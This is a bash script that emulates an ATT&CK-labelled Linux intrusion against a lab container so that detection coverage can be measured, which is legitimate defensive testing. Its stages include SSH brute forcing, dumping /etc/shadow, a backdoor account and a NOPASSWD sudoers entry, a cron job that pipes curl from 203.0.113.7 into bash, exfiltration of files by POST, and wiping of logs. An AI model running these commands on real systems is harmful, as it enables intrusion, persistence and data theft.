#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Scripted Linux intrusion — runs ONLY against the lab's linux-victim container.
# Walks a kill chain with dwell time between stages so detections have time to
# fire. Every stage prints its ATT&CK technique id; a run log is written to
# attack/scenarios/runs/ for scripts/detection-gap-report.ps1.
#
#   Usage:  ./linux-intrusion.sh            (all stages)
#           DWELL=45 ./linux-intrusion.sh   (slower)
#           STAGES="T1110 T1136.001" ./linux-intrusion.sh   (subset)
# ─────────────────────────────────────────────────────────────────────────────
set -u

VICTIM="${VICTIM:-soc-in-a-box-linux-victim-1}"
SSH_PORT="${SSH_PORT:-2222}"
DWELL="${DWELL:-30}"
STAGES="${STAGES:-}"
RUNDIR="$(cd "$(dirname "$0")" && pwd)/runs"
mkdir -p "$RUNDIR"
RUNLOG="$RUNDIR/$(date -u +%Y%m%dT%H%M%SZ).jsonl"

started="$(date -u +%FT%TZ)"
echo "[*] target=$VICTIM  run log=$RUNLOG"

vexec() { docker exec -u root "$VICTIM" bash -lc "$*" 2>&1 | sed 's/^/    /'; }
want()  { [ -z "$STAGES" ] || printf '%s ' $STAGES | grep -q " $1 "; }

stage() {
  local tid="$1" tname="$2"; shift 2
  want "$tid" || return 0
  echo
  echo "== $tid  $tname"
  printf '{"ts":"%s","technique":"%s","name":"%s"}\n' "$(date -u +%FT%TZ)" "$tid" "$tname" >> "$RUNLOG"
  "$@"
  sleep "$DWELL"
}

# ── T1110.001  Brute Force: password guessing over SSH ───────────────────────
s_bruteforce() {
  for u in admin oracle postgres analyst root deploy test; do
    ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
        -p "$SSH_PORT" "$u@localhost" exit 2>/dev/null
  done
  echo "    7 failed SSH auth attempts"
}

# ── T1078  Valid Accounts: the spray finally 'works' (simulated) ─────────────
s_validaccounts() {
  vexec 'logger -p authpriv.info "sshd[2001]: Accepted password for analyst from 203.0.113.7 port 51512 ssh2"'
  vexec 'logger -p authpriv.info "sshd[2001]: pam_unix(sshd:session): session opened for user analyst(uid=1001) by (uid=0)"'
}

# ── T1059.004  Command and Scripting Interpreter: Unix shell ─────────────────
s_execution() {
  vexec 'id; uname -a; cat /etc/os-release | head -2'
}

# ── T1087.001 / T1082 / T1083 / T1057  Discovery ────────────────────────────
s_discovery() {
  vexec 'cat /etc/passwd | tail -n 5; getent group sudo; ps aux | head -n 5; ss -tlnp 2>/dev/null | head'
}

# ── T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow ───────────
s_credaccess() {
  vexec 'cp /etc/shadow /tmp/.s 2>/dev/null; cat /etc/shadow | head -n 3; grep -rIl "password" /home /etc/ 2>/dev/null | head'
}

# ── T1136.001  Create Account: local backdoor user ─────────────────────────
s_persist_user() {
  vexec 'useradd -m -s /bin/bash -u 2000 -o -g root support 2>/dev/null; echo "support:Sup3rSecret!" | chpasswd; id support'
  vexec 'logger -p authpriv.info "useradd[3100]: new user: name=support, UID=2000, GID=0, home=/home/support, shell=/bin/bash"'
}

# ── T1053.003  Scheduled Task/Job: Cron ────────────────────────────────────
s_persist_cron() {
  vexec '(crontab -l 2>/dev/null; echo "*/10 * * * * curl -s http://203.0.113.7/beacon | bash") | crontab -; crontab -l'
}

# ── T1548.003  Abuse Elevation Control: Sudo ───────────────────────────────
s_privesc() {
  vexec 'echo "support ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/99-support; sudo -l -U support 2>/dev/null | tail -n 3'
}

# ── T1105  Ingress Tool Transfer ──────────────────────────────────────────
s_toolxfer() {
  vexec 'curl -s -o /tmp/.x https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt && ls -la /tmp/.x && chmod +x /tmp/.x'
}

# ── T1071.001 / T1041  C2 + Exfil over web ────────────────────────────────
s_c2_exfil() {
  vexec 'tar czf /tmp/.loot.tgz /etc/passwd /etc/group /home 2>/dev/null; \
         for i in $(seq 1 8); do curl -s -m 3 -X POST --data-binary @/tmp/.loot.tgz http://203.0.113.7/upload >/dev/null 2>&1; sleep 1; done; \
         echo exfil-simulated'
}

# ── T1070.003  Indicator Removal: clear shell history & wtmp ──────────────
s_cleanup() {
  vexec 'export HISTFILE=/dev/null; cat /dev/null > ~/.bash_history; : > /var/log/wtmp 2>/dev/null; rm -f /tmp/.x /tmp/.s; echo cleaned'
}

stage T1110.001 "Brute Force - SSH password guessing"      s_bruteforce
stage T1078      "Valid Accounts"                          s_validaccounts
stage T1059.004  "Unix shell execution"                    s_execution
stage T1087.001  "Account/System/File/Process Discovery"   s_discovery
stage T1003.008  "Credential Dumping - /etc/shadow"        s_credaccess
stage T1136.001  "Create Account - local backdoor"         s_persist_user
stage T1053.003  "Scheduled Task/Job - Cron"               s_persist_cron
stage T1548.003  "Privilege Escalation - Sudo"             s_privesc
stage T1105      "Ingress Tool Transfer"                   s_toolxfer
stage T1071.001  "Application Layer Protocol - C2 + exfil"  s_c2_exfil
stage T1070.003  "Indicator Removal - clear history/logs"  s_cleanup

echo
echo "[*] scenario complete  ($started -> $(date -u +%FT%TZ))"
echo "[*] gap report:  pwsh scripts/detection-gap-report.ps1 -RunLog $RUNLOG"
